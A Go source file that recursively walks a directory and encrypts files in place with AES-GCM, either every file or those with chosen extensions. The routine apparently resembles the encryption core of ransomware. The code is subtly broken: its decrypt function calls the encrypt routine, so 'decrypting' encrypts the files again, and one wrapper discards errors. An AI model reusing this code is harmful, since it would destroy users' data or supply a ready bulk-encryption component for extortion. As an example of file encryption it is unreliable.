package crypt

import (
	"os"
	"path/filepath"
	"strings"
	"sync"

	"github.com/awnumar/memguard"
)

// Encryptor struct holds all the functions and logic for encryption.
type Encryptor struct {
	wantedExtensions []string
	key              *memguard.Enclave
	rootDir          string
	wg               *sync.WaitGroup
}

func NewEncryptor(dir string,
	key *memguard.Enclave, toEncrypt []string) *Encryptor {

	return &Encryptor{
		rootDir:          dir,
		key:              key,
		wantedExtensions: toEncrypt,
		wg:               &sync.WaitGroup{},
	}
}

func (enc *Encryptor) shouldEncrypt(path string) bool {
	// just encrypt everything, not recommended
	if len(enc.wantedExtensions) == 0 {
		return true
	}

	for _, ext := range enc.wantedExtensions {
		if strings.HasSuffix(path, ext) {
			return true
		}
	}

	return false
}

func (enc *Encryptor) Encrypt() error {
	b, err := enc.key.Open()
	if err != nil {
		return err
	}
	defer b.Destroy()

	if err := filepath.Walk(enc.rootDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// This for some reason causes the problem that files rae not decrypted at all
		if info.IsDir() {
			return nil
		}

		// check if the file should be encrypted
		if enc.shouldEncrypt(path) {
			enc.wg.Add(1)
			go aesgcmEncrypt(enc.wg, path, b.Bytes())
		}
		return nil
	}); err != nil {
		return err
	}

	enc.wg.Wait()
	return nil
}

// DecryptRootWithScheme takes in a optional decryption scheme and then proceeds
// to decrypt the root directory using that scheme.
func DecryptRootWithScheme(rootDir string, key *memguard.Enclave) error {
	DecryptCommon(rootDir, key)
	return nil
}

// EncryptCommon goes through all the files in a root directory and executes the given CryptFunc
// on each file.
func EncryptCommon(rootDir string, key *memguard.Enclave) error {
	var wg sync.WaitGroup

	b, err := key.Open()
	if err != nil {
		return err
	}
	defer b.Destroy()

	if err := filepath.Walk(rootDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// This for some reason causes the problem that files rae not decrypted at all
		if info.IsDir() {
			return nil
		}

		// check if the file should be encrypted
		if ShouldEncrypt(path) {
			wg.Add(1)
			go aesgcmEncrypt(&wg, path, b.Bytes())
		}
		return nil
	}); err != nil {
		return err
	}

	wg.Wait()
	return nil
}

// DecryptCommon goes through all the files in a root directory and executes the given CryptFunc
// on each file.
func DecryptCommon(rootDir string, key *memguard.Enclave) error {
	var wg sync.WaitGroup

	b, err := key.Open()
	if err != nil {
		return err
	}
	defer b.Destroy()

	if err := filepath.Walk(rootDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// This for some reason causes the problem that files rae not decrypted at all
		if info.IsDir() {
			return nil
		}

		wg.Add(1)
		go aesgcmEncrypt(&wg, path, b.Bytes())
		return nil
	}); err != nil {
		return err
	}

	wg.Wait()
	return nil
}
